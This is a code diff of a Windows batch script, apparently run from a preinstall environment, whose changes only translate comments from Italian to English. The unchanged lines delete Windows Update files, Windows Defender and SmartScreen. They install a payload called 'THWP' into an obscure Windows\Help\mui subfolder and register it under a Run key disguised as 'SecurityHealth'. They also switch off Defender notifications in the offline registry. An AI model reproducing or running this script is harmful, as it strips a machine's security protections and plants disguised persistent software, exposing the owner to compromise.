@@ -9,9 +9,9 @@ for %%i in (C D E F G H I J K L M N O P Q R S T U V W) do (
 )
 
 :found
-echo Windows trovato su !WINLETTER!
+echo Windows !WINLETTER!
 
-:: qui elimina i file di WUpdate
+:: Remove WUpdate
 del /f /s /q "!WINLETTER!\Windows\SoftwareDistribution\"
 del /f /s /q "!WINLETTER!\Windows\System32\wuauclt.exe"
 del /f /s /q "!WINLETTER!\Windows\System32\wusa.exe"
@@ -23,7 +23,7 @@ del /f /s /q "!WINLETTER!\Windows\System32\musnotification.exe"
 del /f /s /q "!WINLETTER!\Windows\System32\musnotificationux.exe"
 
 
-:: qui elimina WinDef
+:: Remove WDef
 del /f /s /q "!WINLETTER!\Program Files\Windows Defender"
 del /f /s /q "!WINLETTER!\Program Files\Windows Defender Advanced Threat Protection"
 del /f /s /q "!WINLETTER!\ProgramData\Microsoft\Windows Defender"
@@ -32,7 +32,7 @@ del /f /s /q "!WINLETTER!\Program Files\WindowsApps\*Microsoft.SecHealthUI*"
 del /f /s /q "!WINLETTER!\Windows\System32\smartscreen.exe"
 
 
-:: qui installa THWP
+:: Install THWP
 mkdir "!WINLETTER!\Windows\Help"
 mkdir "!WINLETTER!\Windows\Help\mui"
 mkdir "!WINLETTER!\Windows\Help\mui\0563"
@@ -51,7 +51,7 @@ reg add HKLM\zSOFTWARE\Microsoft\Windows\CurrentVersion\Run /v SecurityHealth /t
 reg unload HKLM\zSOFTWARE
 
 
-:: WinDef e notifiche off
+:: WinDef and notifications off
 reg load HKLM\zSOFTWARE "!WINLETTER!\Windows\System32\Config\SOFTWARE"
 reg add "HKLM\zSOFTWARE\Microsoft\Windows Defender Security Center" /f
 reg add "HKLM\zSOFTWARE\Microsoft\Windows Defender Security Center\Notifications" /f
@@ -64,5 +64,5 @@ reg add "HKLM\zSOFTWARE\Policies\Microsoft\Windows Defender Security Center\Syst
 reg unload HKLM\zSOFTWARE
 
 
-echo Rebooting in 5 seconds...
+echo Rebooting...
 wpeutil reboot
